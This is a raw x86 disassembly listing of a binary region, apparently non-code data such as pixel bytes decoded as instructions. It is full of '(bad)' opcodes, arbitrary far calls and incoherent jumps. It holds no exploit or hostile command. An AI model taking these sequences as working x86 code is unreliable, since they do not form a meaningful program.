  4137bc:	int    0xcd
  4137be:	int3   
  4137bf:	dec    esp
  4137c1:	rcl    ebx,cl
  4137c3:	call   FWORD PTR [esp+ebx*4-0x67680b64]
  4137ca:	cwde   
  4137cb:	adc    eax,DWORD PTR [eax]
	...
  4137d9:	add    BYTE PTR [eax],al
  4137db:	add    BYTE PTR [ebx-0x2f796c70],dl
  4137e1:	leave  
  4137e2:	retf   0xceff
  4137e5:	enter  0xffc9,0xb3
  4137e9:	scas   eax,DWORD PTR es:[edi]
  4137ea:	mov    al,0xff
  4137ec:	mov    ebx,0xbfffbab9
  4137f1:	mov    edi,0xa9a9ffc1
  4137f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137f7:	jmp    FWORD PTR [ecx-0x53005657]
  4137fd:	lods   al,BYTE PTR ds:[esi]
  4137fe:	lods   al,BYTE PTR ds:[esi]
  4137ff:	(bad)  
  413800:	mov    edx,0xa4ffbdbc
  413805:	mov    ds:0xe82ffa5,al
  41380a:	add    eax,0x121b90ff
  41380f:	call   DWORD PTR [edx-0x7100e2db]
  413815:	push   ds
  413816:	adc    eax,0x121b8cff
  41381b:	dec    DWORD PTR [ebx-0x7600f1e9]
  413821:	adc    al,0xc
  413823:	dec    DWORD PTR [ecx-0x7200f9ee]
  413829:	or     eax,0xd91ff00
  41382e:	add    bh,bh
  413830:	xchg   ebp,eax
  413831:	(bad)  
  413833:	(bad)  
  413834:	jnp    0x41385b
  413836:	sbb    al,0xff
  413838:	mov    bl,0xaa
  41383a:	test   eax,0xb6b6b6ff
  41383f:	(bad)  
  413840:	mov    esi,0x89ffbebe
  413845:	fs popa 
  413847:	jmp    DWORD PTR [ebx-0x3700f5e3]
  41384d:	push   eax
  41384e:	ds dec esi
  413851:	pusha  
  413852:	dec    esi
  413853:	call   ecx
  413855:	pop    esi
  413856:	dec    esp
  413857:	call   ebp
  413859:	pusha  
  41385a:	dec    ebp
  41385b:	call   edi
  41385d:	bound  ecx,QWORD PTR [esi-0x1]
  413860:	fldenv [eax+edx*2-0x1]
  413864:	(bad)  [ebp+0x50]
  413867:	(bad)  
  413868:	fisub  WORD PTR [esi+0x51]
  41386b:	(bad)  
  41386c:	fbld   TBYTE PTR [edi+0x52]
  41386f:	jmp    ecx
  413871:	ins    BYTE PTR es:[edi],dx
  413872:	push   edi
  413873:	jmp    esp
  413875:	pop    edi
  413876:	inc    edi
  413877:	(bad)  
  413878:	fsub   QWORD PTR [ebp+0x50]
  41387b:	dec    edi
  41387d:	leave  
  41387e:	(bad)  
  41387f:	call   eax
  413881:	(bad)  
  413883:	call   FWORD PTR [edi-0x65016262]
  413889:	call   0x0:0x3f9a
	...
  41389c:	xchg   ebx,eax
  41389d:	xchg   ebx,eax
  41389e:	xchg   ebp,eax
  41389f:	xchg   bh,cl
  4138a1:	enter  0xffc7,0xcc
  4138a5:	(bad)
  4138a8:	mov    dl,0xb1
  4138aa:	scas   al,BYTE PTR es:[edi]
  4138ab:	(bad)  
  4138ac:	mov    ebx,0xc2ffbbba
  4138b1:	ret    0xffc3
  4138b4:	lods   al,BYTE PTR ds:[esi]
  4138b5:	stos   BYTE PTR es:[edi],al
  4138b6:	stos   DWORD PTR es:[edi],eax
  4138b7:	jmp    FWORD PTR [edx-0x4f005556]
  4138bd:	mov    al,0xb0
  4138bf:	inc    eax
  4138c1:	rol    ecx,0xff
  4138c4:	mov    al,0xb6
  4138c6:	mov    edx,0x1f2487ff
  4138cb:	call   DWORD PTR [ecx-0x6800ede4]
  4138d1:	cs daa 
  4138d3:	call   DWORD PTR [ebx-0x6e00e1da]
  4138d9:	and    ebx,DWORD PTR [ebx]
  4138db:	dec    DWORD PTR [esi-0x7000e8e1]
  4138e1:	pop    ds
  4138e2:	push   ss
  4138e3:	dec    DWORD PTR [edi-0x7000f7eb]
  4138e9:	or     eax,DWORD PTR [eax]
  4138eb:	call   DWORD PTR [ebp-0x6c00fff2]
  4138f1:	cmp    BYTE PTR [esi],ch
  4138f3:	(bad)  
  4138f4:	mov    ebp,0xd4ffadaf
  4138f9:	aam    0xd4
  4138fb:	dec    ecx
  4138fd:	leave  
  4138fe:	leave  
  4138ff:	inc    edx
  413901:	ret    0xffc2
  413904:	enter  0xc5c5,0xff
  413908:	xchg   BYTE PTR [edi],dh
  41390a:	sub    edi,edi
  41390c:	shl    DWORD PTR [eax+0x4e],1
  41390f:	call   esi
  413911:	ins    DWORD PTR es:[edi],dx
  413912:	pop    ebx
  413913:	(bad)  
  413914:	fldcw  WORD PTR [ebx+0x58]
  413917:	(bad)  
  413918:	fld    TBYTE PTR [ebp+0x5a]
  41391b:	(bad)  
  41391c:	fisubr WORD PTR [esi+0x5b]
  41391f:	jmp    eax
  413921:	jo     0x413980
  413923:	jmp    ebx
  413925:	jno    0x413984
  413927:	jmp    ebp
  413929:	jae    0x413989
  41392b:	jmp    esi
  41392d:	je     0x41398e
  41392f:	jmp    edi
  413931:	js     0x413996
  413933:	(bad)  
  413934:	call   0xe54091a7
  413939:	push   0x54
  41393b:	call   edx
  41393d:	(bad)
  413940:	aad    0xdd
  413942:	(bad)  
  413944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413945:	mov    ds:0x9999ffa2,al
  41394a:	cdq    
  41394b:	push   0x0
	...
  41395c:	xchg   ebx,eax
  41395d:	xchg   edx,eax
  41395e:	xchg   esi,eax
  41395f:	xchg   ah,cl
  413961:	(bad)  
  413962:	enter  0xc6ff,0xbe
  413966:	sar    bh,0xa5
  413969:	mov    ds:0xb6b9ffa0,eax
  41396e:	mov    bh,0xff
  413970:	mov    ah,0xc7
  413973:	push   DWORD PTR [ecx-0x4d004f51]
  413979:	mov    bl,0xb2
  41397b:	(bad)  
  41397c:	mov    ecx,0xc3ffb9b9
  413981:	ret    
  413982:	ret    
  413983:	push   DWORD PTR [esi-0x71003b41]
  413989:	ds cmp edi,edi
  41398c:	xchg   ecx,eax
  41398d:	sbb    edx,DWORD PTR [ecx]
  41398f:	call   FWORD PTR [eax+edi*1+0x2f97ff31]
  413996:	sub    bh,bh
  413998:	xchg   ebp,eax
  413999:	sub    esp,DWORD PTR ds:0x212994ff
  41399f:	call   DWORD PTR [esi-0x6e00e2d8]
  4139a5:	adc    BYTE PTR [edi+edi*8],al
  4139a8:	(bad)  
  4139a9:	or     eax,0x3085ff00
  4139ae:	daa    
  4139af:	dec    edx
  4139b1:	mov    esp,0xececffbb
  4139b6:	in     al,dx
  4139b7:	(bad)  
  4139b8:	(bad)  
  4139ba:	aam    0xff
  4139bc:	mov    bh,0x94
  4139be:	nop
  4139bf:	inc    ebp
  4139c1:	mov    edx,0xdedeffb8
  4139c6:	fdivp  st(7),st
  4139c8:	mov    dl,0xa1
  4139ca:	lahf   
  4139cb:	push   DWORD PTR [edx-0x2200aea0]
  4139d1:	jns    0x413a3c
  4139d3:	(bad)  
  4139d4:	fbstp  TBYTE PTR [edi+0x66]
  4139d7:	jmp    edx
  4139d9:	jns    0x413a42
  4139db:	jmp    esi
  4139dd:	jnp    0x413a47
  4139df:	jmp    esi
  4139e1:	jl     0x413a4c
  4139e3:	(bad)  
  4139e4:	call   0xeb40a466
  4139e9:	jg     0x413a56
  4139eb:	(bad)  
  4139ec:	jmp    0x41396e
  4139ee:	ins    BYTE PTR es:[edi],dx
  4139ef:	(bad)  
  4139f0:	in     al,dx
  4139f1:	sub    BYTE PTR [ebp-0x1],0xf0
  4139f5:	sub    BYTE PTR [ebx-0x1],0xea
  4139f9:	ins    DWORD PTR es:[edi],dx
  4139fa:	push   ebp
  4139fb:	call   edx
  4139fd:	mov    esp,0xdfd5ffb7
  413a02:	loope  0x413a03
  413a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a07:	call   FWORD PTR [ecx+0x8b9999]
	...
  413a19:	add    BYTE PTR [eax],al
  413a1b:	add    BYTE PTR [edx+edx*4-0x3f39796c],dl
  413a22:	sar    bh,0xbe
  413a25:	mov    ebx,0x9fa3ffbb
  413a2a:	lahf   
  413a2b:	push   DWORD PTR [esi-0x36004a4c]
  413a31:	retf   
  413a32:	leave  
  413a33:	(bad)  
  413a34:	mov    ecx,0xb9ffb9bb
  413a39:	mov    ecx,0xbcbcffb9
  413a3e:	mov    esp,0xc7c6c6ff
  413a43:	(bad)  
  413a44:	mov    ecx,0x99ffc7c3
  413a49:	push   esi
  413a4a:	push   edx
  413a4b:	call   DWORD PTR [ecx-0x5c00eee6]
  413a51:	inc    esp
  413a52:	cmp    eax,0x32379cff
  413a57:	call   FWORD PTR [edx-0x6200d0ca]
  413a5d:	cmp    BYTE PTR [edi],ch
  413a5f:	call   FWORD PTR [ebx-0x7500e5da]
  413a65:	push   cs
  413a66:	add    edi,edi
  413a68:	cmp    DWORD PTR ds:0xd4daff36,0xffffffd3
  413a72:	(bad)  
  413a73:	(bad)  
  413a74:	out    dx,al
  413a75:	out    dx,al
  413a76:	out    dx,al
  413a77:	call   FWORD PTR [edi-0x5300a69e]
  413a7d:	and    BYTE PTR [edi+edi*8],cl
  413a80:	mov    bl,0x77
  413a82:	outs   dx,BYTE PTR ds:[esi]
  413a83:	jmp    eax
  413a85:	loopne 0x413a67
  413a87:	(bad)  
  413a88:	out    dx,al
  413a89:	out    dx,al
  413a8a:	out    dx,al
  413a8b:	jmp    DWORD PTR [eax-0x28008581]
  413a91:	jg     0x413b03
  413a93:	jmp    ebp
  413a95:	test   BYTE PTR [ebx-0x1],dh
  413a98:	jmp    0xeb40b023
  413a9d:	xchg   DWORD PTR [ebp-0x1],esi
  413aa0:	in     al,dx
  413aa1:	mov    DWORD PTR [edi-0x1],esi
  413aa4:	out    dx,al
  413aa5:	mov    bh,BYTE PTR [eax-0x1]
  413aa8:	lock mov edi,DWORD PTR [ecx-0x1]
  413aac:	icebp  
  413aad:	lea    edi,[edx-0x1]
  413ab0:	repnz (bad) 
  413ab2:	jl     0x413ab3
  413ab4:	not    BYTE PTR [ecx+0x74f3ff7d]
  413aba:	pop    ebp
  413abb:	(bad)  
  413abc:	fdiv   DWORD PTR [edx-0x1d2a0056]
  413ac2:	in     al,0xff
  413ac4:	test   eax,0x96ffaaaa
  413ac9:	xchg   esi,eax
  413aca:	xchg   esi,eax
  413acb:	mov    bl,0x0
	...
  413ad9:	add    BYTE PTR [eax],al
  413adb:	add    BYTE PTR [edx-0x43796a6d],dl
  413ae1:	mov    eax,0xb2bbffba
  413ae6:	mov    ah,0xff
  413ae8:	mov    eax,ds:0xb4ff9a99
  413aed:	mov    dl,0xb4
  413aef:	dec    esp
  413af1:	int    0xcf
  413af3:	(bad)  
  413af4:	mov    esi,0xbdffbec0
  413af9:	mov    ebp,0xbfbfffbd
  413afe:	mov    edi,0xc6c6c6ff
  413b03:	(bad)  
  413b04:	mov    edx,0x97ffc7c4
  413b09:	call   WORD PTR gs:[ecx-0x5700ede6]
  413b11:	push   eax
  413b12:	dec    eax
  413b13:	jmp    DWORD PTR [ecx-0x5e00c2be]
  413b19:	inc    edx
  413b1a:	cmp    edi,edi
  413b1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b1d:	inc    edx
  413b1e:	cmp    bh,bh
  413b20:	xchg   ebp,eax
  413b21:	pop    ss
  413b22:	or     bh,bh
  413b24:	(bad)  
  413b25:	and    bl,BYTE PTR [edx]
  413b27:	dec    ecx
  413b29:	mov    eax,0xffffffb6
  413b2e:	(bad)  
  413b2f:	(bad)  
  413b30:	jmp    0xaa41221c
  413b35:	push   0x61
  413b37:	jmp    FWORD PTR [ecx-0x4600fae6]
  413b3d:	sbb    BYTE PTR [eax],al
  413b3f:	push   DWORD PTR [eax-0x2e00e4d2]
  413b45:	mov    edi,0xf2f2ffbd
  413b4a:	bnd jmp edx
  413b4d:	loope  0x413b30
  413b4f:	jmp    FWORD PTR [eax-0x1400968e]
  413b55:	xchg   edx,eax
  413b56:	cmp    edi,0xff8393ee
  413b5c:	out    dx,eax
  413b5d:	xchg   ebp,eax
  413b5e:	test   bh,bh
  413b60:	icebp  
  413b61:	xchg   esi,eax
  413b62:	test   edi,edi
  413b64:	repz xchg edi,eax
  413b66:	xchg   bh,bh
  413b68:	cmc    
  413b69:	cwde   
  413b6a:	xchg   edi,edi
  413b6c:	cmc    
  413b6d:	cdq    
  413b6e:	mov    bh,bh
  413b70:	neg    BYTE PTR [edx-0x5f060077]
  413b76:	mov    ?,edi
  413b78:	stc    
  413b79:	sub    BYTE PTR [edx-0x1],0xdb
  413b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b7e:	call   0xb5ff:0xe4e2d8ff
  413b85:	mov    ch,0xb5
  413b87:	call   DWORD PTR [edi+0xc99797]
	...
  413b99:	add    BYTE PTR [eax],al
  413b9b:	add    BYTE PTR [ebx-0x43796a6e],dl
  413ba1:	scas   al,BYTE PTR es:[edi]
  413ba2:	mov    ah,0xff
  413ba4:	ret    
  413ba5:	stos   BYTE PTR es:[edi],al
  413ba6:	mov    dl,0xff
  413ba8:	test   eax,0xb3ffa09c
  413bad:	mov    cl,0xb6
  413baf:	dec    ebp
  413bb1:	iret   
  413bb2:	iret   
  413bb3:	inc    ebx
  413bb5:	(bad)  
  413bb9:	ret    0xffc2
  413bbc:	(bad)  
  413bbd:	(bad)  
  413bbe:	(bad)  
  413bbf:	inc    esi
  413bc1:	mov    dh,0xff
  413bc4:	mov    esi,0x9cffc8c6
  413bc9:	jg     0x413b4b
  413bcb:	dec    DWORD PTR [edi-0x5200e8e2]
  413bd1:	pop    eax
  413bd2:	push   ecx
  413bd3:	jmp    DWORD PTR [ebp-0x5400b8b4]
  413bd9:	push   ecx
  413bda:	dec    ecx
  413bdb:	jmp    DWORD PTR [esi-0x6d00cdc4]
  413be1:	or     eax,DWORD PTR [eax]
  413be3:	call   DWORD PTR [edi-0x6600fbee]
  413be9:	inc    ecx
  413bea:	push   DWORD PTR ss:[esi-0x62007f79]
  413bf1:	inc    ebx
  413bf2:	jmp    FWORD PTR ss:[esi-0x4800fae6]
  413bf9:	sbb    BYTE PTR [eax],al
  413bfb:	(bad)  
  413bfc:	mov    esi,0xc4ff001b
  413c01:	sbb    al,BYTE PTR [eax]
  413c03:	push   DWORD PTR [ecx-0x1700aea4]
  413c09:	call   0xfe3f3bf6
  413c0e:	std    
  413c0f:	(bad)  
  413c10:	mov    esi,0xcdffb0b2
  413c15:	mov    BYTE PTR [ebx-0x1],bh
  413c18:	icebp  
  413c19:	sahf   
  413c1a:	mov    ?,edi
  413c1c:	repz mov al,ds:0xa1f5ff90
  413c22:	nop
  413c23:	push   edi
  413c25:	mov    ds:0xa3f8ff91,al
  413c2a:	xchg   edx,eax
  413c2b:	(bad)  
  413c2c:	stc    
  413c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c2e:	xchg   ebx,eax
  413c2f:	(bad)  
  413c30:	cli    
  413c31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c32:	xchg   esp,eax
  413c33:	(bad)  
  413c34:	sti    
  413c35:	stos   DWORD PTR es:[edi],eax
  413c36:	fwait
  413c37:	(bad)  
  413c38:	dec    DWORD PTR [edi-0x621c0087]
  413c3e:	(bad)  
  413c3f:	(bad)  
  413c40:	fcomp  st(7)
  413c42:	loop   0x413c43
  413c44:	mov    esi,0x96ffc0c0
  413c49:	xchg   esi,eax
  413c4a:	xchg   esi,eax
  413c4b:	aad    0x0
	...
  413c59:	add    BYTE PTR [eax],al
  413c5b:	add    BYTE PTR [esp+ecx*4-0x566a796a],bl
  413c62:	popf   
  413c63:	jmp    DWORD PTR [ecx-0x25]
  413c66:	pushf  
  413c67:	call   DWORD PTR [ecx-0x3c005845]
  413c6d:	lods   al,BYTE PTR ds:[esi]
  413c6e:	mov    eax,0xd1d1d0ff
  413c73:	inc    edi
  413c75:	mov    edi,0xc6c6c6ff
  413c7b:	inc    edi
  413c7d:	mov    edi,0xc9c9c9ff
  413c83:	inc    edx
  413c85:	(bad)  
  413c86:	retf   0xa9ff
  413c89:	call   0xff1d:0x268dff9a
  413c90:	scas   eax,DWORD PTR es:[edi]
  413c91:	pop    ebx
  413c92:	push   ebp
  413c93:	jmp    FWORD PTR [ecx+ebx*2+0x5db2ff51]
  413c9a:	push   esp
  413c9b:	call   FWORD PTR [ebp-0x6c00e4d7]
  413ca1:	or     DWORD PTR [eax],eax
  413ca3:	call   FWORD PTR [ebp-0x5a00ffef]
  413ca9:	adc    eax,DWORD PTR [eax]
  413cab:	jmp    FWORD PTR [ecx-0x5100f9e6]
  413cb1:	push   ss
  413cb2:	add    bh,bh
  413cb4:	mov    ch,0x18
  413cb6:	add    bh,bh
  413cb8:	mov    ebx,0xc3ff0019
  413cbd:	sbb    eax,DWORD PTR [eax]
  413cbf:	inc    edi
  413cc1:	sbb    BYTE PTR [eax],al
  413cc3:	inc    edx
  413cc5:	and    ecx,DWORD PTR [ecx]
  413cc7:	dec    edx
  413cc9:	scas   eax,DWORD PTR es:[edi]
  413cca:	stos   BYTE PTR es:[edi],al
  413ccb:	push   edx
  413ccd:	repnz repnz (bad) 
  413cd0:	sti    
  413cd1:	sti    
  413cd2:	sti    
  413cd3:	jmp    FWORD PTR [ecx-0x12007773]
  413cd9:	mov    ds:0xa9f7ff95,al
  413cde:	call   0xf9ff:0x9babf9ff
  413ce5:	lods   al,BYTE PTR ds:[esi]
  413ce6:	pushf  
  413ce7:	(bad)  
  413ce8:	sti    
  413ce9:	lods   eax,DWORD PTR ds:[esi]
  413cea:	sahf   
  413ceb:	(bad)  
  413cec:	cld    
  413ced:	scas   al,BYTE PTR es:[edi]
  413cee:	sahf   
  413cef:	(bad)  
  413cf0:	std    
  413cf1:	scas   al,BYTE PTR es:[edi]
  413cf2:	lahf   
  413cf3:	(bad)  
  413cf4:	(bad)  
  413cf5:	mov    ch,0xa5
  413cf7:	(bad)  
  413cf8:	call   FWORD PTR [ebp-0x60120077]
  413cfe:	nop
  413cff:	(bad)  
  413d00:	fchs   
  413d02:	loopne 0x413d03
  413d04:	ret    
  413d05:	mov    bh,0xff
  413d08:	xchg   esi,eax
  413d09:	xchg   ebp,eax
  413d0a:	xchg   ebp,eax
  413d0b:	in     al,0x0
	...
  413d19:	add    BYTE PTR [eax],al
  413d1b:	add    BYTE PTR [edi+0x347d9a8b],bl
  413d21:	int    0x7e
  413d23:	inc    DWORD PTR [eax]
  413d25:	jmp    FWORD PTR [ebx-0x1]
  413d28:	je     0x413ce1
  413d2a:	fwait
  413d2b:	dec    edx
  413d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d2e:	mov    edx,0xd3d3d3ff
  413d33:	dec    ebx
  413d35:	retf   
  413d36:	retf   
  413d37:	dec    ecx
  413d39:	leave  
  413d3a:	leave  
  413d3b:	dec    ebx
  413d3d:	retf   
  413d3e:	retf   
  413d3f:	dec    ebx
  413d41:	retf   
  413d42:	retf   
  413d43:	dec    edx
  413d45:	int    0xcf
  413d47:	push   DWORD PTR [edx-0x6e005052]
  413d4d:	xor    BYTE PTR [edx],ch
  413d4f:	push   DWORD PTR [ecx-0x4b00aaa6]
  413d55:	addr16 pop edi
  413d57:	push   DWORD PTR [ebp-0x6800a9a1]
  413d5d:	push   ss
  413d5e:	or     bh,bh
  413d60:	cwde   
  413d61:	or     al,BYTE PTR [eax]
  413d63:	jmp    DWORD PTR [ecx-0x5800ffee]
  413d69:	adc    al,0x0
  413d6b:	jmp    FWORD PTR [ebp+edx*1+0x16b2ff00]
  413d72:	add    bh,bh
  413d74:	mov    bh,0x18
  413d76:	add    bh,bh
  413d78:	mov    esi,0xc4ff001a
  413d7d:	sbb    al,0x0
  413d7f:	dec    ecx
  413d81:	pop    ss
  413d82:	add    bh,bh
  413d84:	shl    BYTE PTR [edi],cl
  413d86:	or     bh,bh
  413d88:	ret    0x7481
  413d8b:	(bad)  
  413d8c:	fcom   st(3)
  413d8e:	sar    edi,cl
  413d90:	cmc    
  413d91:	cmc    
  413d92:	cmc    
  413d93:	(bad)  
  413d94:	in     al,dx
  413d95:	jmp    0x413d82
  413d97:	jmp    FWORD PTR [ebp-0x600837d]
  413d9d:	mov    bl,0xa5
  413d9f:	(bad)  
  413da0:	sti    
  413da1:	mov    ah,0xa5
  413da3:	(bad)  
  413da4:	cld    
  413da5:	mov    dh,0xa7
  413da7:	(bad)  
  413da8:	(bad)  
  413da9:	mov    bh,0xa7
  413dab:	(bad)  
  413dac:	(bad)  
  413dad:	mov    eax,0xb7ffffa8
  413db2:	test   eax,0xafbdffff
  413db7:	(bad)  
  413db8:	jmp    FWORD PTR [ebp-0x5e110066]
  413dbe:	(bad)  
  413dbf:	(bad)  
  413dc0:	fcmovnu st,st(6)
  413dc2:	fdivp  st(7),st
  413dc4:	enter  0xcdcb,0xff
  413dc8:	xchg   ebp,eax
  413dc9:	xchg   ebp,eax
  413dca:	xchg   ebp,eax
  413dcb:	lock fwait
  413dcd:	fwait
  413dce:	fwait
  413dcf:	and    BYTE PTR [eax],al
	...
  413dd9:	add    BYTE PTR [eax],al
  413ddb:	add    BYTE PTR [edx+0x3e6e9f9a],bl
  413de1:	xchg   esp,eax
  413de2:	inc    DWORD PTR ds:0x1b54
  413de7:	(bad)  
  413de8:	jge    0x413e5c
  413dea:	je     0x413deb
  413dec:	ret    
  413ded:	mov    edx,0xd8d5ffc3
  413df2:	fcos   
  413df4:	iret   
  413df5:	iret   
  413df6:	iret   
  413df7:	dec    esp
  413df9:	int3   
  413dfa:	int3   
  413dfb:	dec    ebp
  413dfd:	int    0xcd
  413dff:	dec    esi
  413e01:	into   
  413e02:	into   
  413e03:	call   eax
  413e05:	rcl    esp,cl
  413e07:	(bad)  
  413e08:	mov    esp,0x96ffbbb8
  413e0d:	cmp    dh,BYTE PTR [edi+edi*8]
  413e10:	mov    cl,0x5c
  413e12:	push   ebp
  413e13:	(bad)  
  413e14:	mov    esi,0xacff727a
  413e19:	dec    esp
  413e1a:	inc    edx
  413e1b:	call   DWORD PTR [ebp-0x6100fff7]
  413e21:	(bad)  
  413e23:	jmp    DWORD PTR [ebp-0x5600ffed]
  413e29:	adc    al,0x0
  413e2b:	push   DWORD PTR [eax-0x4700ffea]
  413e31:	sbb    DWORD PTR [eax],eax
  413e33:	inc    ebx
  413e35:	sbb    eax,DWORD PTR [eax]
  413e37:	dec    ebx
  413e39:	push   ds
  413e3a:	add    bh,bh
  413e3c:	rcr    DWORD PTR [edi],cl
  413e3e:	add    bh,bh
  413e40:	ficom  DWORD PTR [edi]
  413e42:	add    bh,bh
  413e44:	out    0x3d,al
  413e46:	sbb    eax,0x99aaf7ff
  413e4b:	(bad)  
  413e4c:	mov    edi,0xd7ff9ba2
  413e51:	xlat   BYTE PTR ds:[ebx]
  413e52:	xlat   BYTE PTR ds:[ebx]
  413e53:	(bad)  
  413e54:	out    dx,eax
  413e55:	out    dx,eax
  413e56:	out    dx,eax
  413e57:	inc    esi
  413e59:	mov    edi,0x9dcdffbd
  413e5e:	xchg   ecx,eax
  413e5f:	(bad)  
  413e60:	inc    edx
  413e62:	mov    cl,0xff
  413e64:	inc    ebx
  413e66:	mov    bl,0xff
  413e68:	inc    ebp
  413e6a:	mov    bl,0xff
  413e6c:	inc    esi
  413e6e:	mov    ah,0xff
  413e70:	inc    edi
  413e72:	mov    ch,0xff
  413e74:	dec    edx
  413e76:	mov    ecx,0xadc2ffff
  413e7b:	push   ecx
  413e7d:	test   eax,0xdadeff8f
  413e82:	fcos   
  413e84:	int    0xd1
  413e86:	sar    edi,cl
  413e88:	xchg   esi,eax
  413e89:	xchg   esi,eax
  413e8a:	xchg   esi,eax
  413e8b:	cld    
  413e8c:	fwait
  413e8d:	fwait
  413e8e:	fwait
  413e8f:	dec    edx
	...
  413e9c:	cdq    
  413e9d:	xchg   edi,eax
  413e9e:	pushf  
  413e9f:	outs   dx,BYTE PTR ds:[esi]
  413ea0:	arpl   WORD PTR [ebp+edx*2-0x1],ax
  413ea4:	daa    
  413ea5:	add    BYTE PTR [edx],al
  413ea7:	(bad)  
  413ea8:	jl     0x413f17
  413eaa:	ins    BYTE PTR es:[edi],dx
  413eab:	(bad)  
  413eac:	mov    ebp,0xd5ffc1c0
  413eb1:	(bad)  
  413eb2:	xlat   BYTE PTR ds:[ebx]
  413eb3:	call   eax
  413eb5:	rcl    al,1
  413eb7:	dec    edi
  413eb9:	iret   
  413eba:	iret   
  413ebb:	call   ecx
  413ebd:	rcl    ecx,1
  413ebf:	call   edx
  413ec1:	rcl    dl,cl
  413ec3:	call   esi
  413ec5:	xlat   BYTE PTR ds:[ebx]
  413ec6:	fdivr  st,st(7)
  413ec8:	mov    ebx,0x95ffbcbb
  413ecd:	cmp    al,0x34
  413ecf:	push   DWORD PTR [edi+ebx*2-0x7f3b00a7]
  413ed6:	jp     0x413ed7
  413ed8:	lahf   
  413ed9:	sub    bl,BYTE PTR ds:0x799ff
  413edf:	jmp    DWORD PTR [esi-0x5100ffee]
  413ee5:	adc    eax,0x18b6ff00
  413eea:	add    bh,bh
  413eec:	ret    0x1b
  413eef:	dec    edx
  413ef1:	push   ds
  413ef2:	add    bh,bh
  413ef4:	shl    BYTE PTR [eax],cl
  413ef6:	add    bh,bh
  413ef8:	(bad)  [edx]
  413efa:	add    bh,bh
  413efc:	loop   0x413f20
  413efe:	add    bh,bh
  413f00:	call   0xf5403f20
  413f05:	pop    ecx
  413f06:	aaa    
  413f07:	(bad)  
  413f08:	std    
  413f09:	mov    edi,0xc4f5ffb3
  413f0e:	mov    ecx,0xaaaec1ff
  413f13:	dec    edi
  413f15:	iret   
  413f16:	iret   
  413f17:	jmp    eax
  413f19:	loopne 0x413efb
  413f1b:	jmp    FWORD PTR [ecx-0x17006663]
  413f21:	mov    edx,0xccffffab
  413f26:	mov    esp,0xbdceffff
  413f2b:	(bad)  
  413f2c:	dec    edi
  413f2e:	mov    esi,0xbed0ffff
  413f33:	(bad)  
  413f34:	call   esp
  413f36:	ret    0xffff
  413f39:	sar    DWORD PTR [edi+edi*8-0x70520a],1
  413f40:	(bad)  
  413f42:	sar    edi,1
  413f44:	rcl    edi,cl
  413f46:	fcos   
  413f48:	cwde   
  413f49:	xchg   edi,eax
  413f4a:	xchg   edi,eax
  413f4b:	call   FWORD PTR [edx+0x719a9a]
	...
  413f59:	add    BYTE PTR [eax],al
  413f5b:	add    BYTE PTR [esi+0x6879a19d],bl
  413f61:	fs call DWORD PTR gs:[ebx+ecx*2+0x43]
  413f67:	inc    DWORD PTR [edi-0x52008080]
  413f6d:	scas   al,BYTE PTR es:[edi]
  413f6e:	mov    cl,0xff
  413f70:	loope  0x413f53
  413f72:	loop   0x413f73
  413f74:	iret   
  413f75:	iret   
  413f76:	iret   
  413f77:	dec    eax
  413f79:	enter  0xffc8,0xce
  413f7d:	into   
  413f7e:	into   
  413f7f:	call   edx
  413f81:	rcl    dl,cl
  413f83:	(bad)  
  413f84:	fcmovnu st,st(3)
  413f86:	(bad)  
  413f88:	mov    ebx,0x8fffc1c0
  413f8d:	ds cmp edi,edi
  413f90:	mov    ecx,0xbfff5d65
  413f95:	jb     0x414000
  413f97:	call   FWORD PTR [eax+edx*1+0xfa5ff04]
  413f9e:	add    bh,bh
  413fa0:	lods   eax,DWORD PTR ds:[esi]
  413fa1:	adc    eax,0x17b5ff00
  413fa6:	add    bh,bh
  413fa8:	mov    esi,0xc6ff001a
  413fad:	sbb    al,0x0
  413faf:	dec    ebp
  413fb1:	push   ds
  413fb2:	add    bh,bh
  413fb4:	aam    0x21
  413fb6:	add    bh,bh
  413fb8:	(bad)  [ebx]
  413fba:	add    bh,bh
  413fbc:	jecxz  0x413fe0
  413fbe:	add    bh,bh
  413fc0:	jmp    0x413fe1
  413fc2:	add    bh,bh
  413fc4:	div    BYTE PTR [edx+0x56]
  413fc7:	(bad)  
  413fc8:	dec    dh
  413fca:	(bad)  
  413fcb:	(bad)  
  413fcc:	dec    esi
  413fce:	(bad)  
  413fd1:	shl    DWORD PTR [edi-0x4f4d4401],0xff
  413fd8:	leave  
  413fd9:	leave  
  413fda:	leave  
  413fdb:	(bad)  
  413fdc:	fcomp  st(0)
  413fde:	fdivr  st,st(7)
  413fe0:	mov    al,ds:0xf5ff8a90
  413fe5:	int3   
  413fe6:	mov    ebp,0xc5d5ffff
  413feb:	(bad)  
  413fec:	call   esi
  413fee:	(bad)  
  413ff1:	(bad)  
  413ff2:	(bad)  
  413ff3:	(bad)  
  413ff4:	(bad)  
  413ff5:	fmul   st,st(1)
  413ff7:	(bad)  
  413ff8:	(bad)  
  413ff9:	fcmove st,st(2)
  413ffb:	(bad)  
  413ffc:	sti    
  413ffd:	mov    bl,0x95
  413fff:	(bad)  
  414000:	(bad)  
  414002:	(bad)  
  414003:	(bad)  
  414004:	fsubr  st(0),st
  414006:	loop   0x414007
  414008:	call   0x9999:0x99ff9b9b
  41400f:	mov    eax,DWORD PTR [eax]
	...
  414019:	add    BYTE PTR [eax],al
  41401b:	add    BYTE PTR [ebp-0x6fc55a5e],ah
  414021:	xchg   ecx,eax
  414022:	(bad)  
  414023:	call   DWORD PTR [edx-0x61006e6c]
  414029:	cdq    
  41402a:	pushf  
  41402b:	(bad)  
  41402c:	fcmovu st,st(0)
  41402e:	(bad)  
  414030:	(bad)  
  414031:	(bad)  
  414032:	(bad)  
  414033:	(bad)  
  414034:	clc    
  414035:	clc    
  414036:	clc    
  414037:	jmp    ebp
  414039:	in     eax,0xe5
  41403b:	(bad)  
  41403c:	(bad)  
  41403e:	fcos   
  414040:	rcl    ebx,cl
  414042:	sar    edi,cl
